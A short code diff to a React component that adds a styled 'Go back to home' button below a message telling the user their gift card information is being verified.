@@ -127,6 +127,22 @@ export default function handlecheck() {
           <p style={{ fontSize: '1.15rem', color: '#444', textAlign: 'center', maxWidth: '500px', marginBottom: 24 }}>
             We're verifying your gift card information. we will get back to you shortly...
           </p>
+          
+          {/* Go back to home button */}
+          <Link href="/" passHref legacyBehavior>
+            <button style={{
+              background: '#fff',
+              color: '#0071e3',
+              border: '2px solid #0071e3',
+              borderRadius: 26,
+              fontWeight: 'bold',
+              fontSize: '1rem',
+              padding: '0.7rem 2rem',
+              cursor: 'pointer',
+              marginBottom: '16px'
+            }}>Go back to home</button>
+          </Link>
+
           {/* Progress dots */}
           <div style={{ display: 'flex', gap: '8px', marginTop: '16px' }}>
             <div style={{
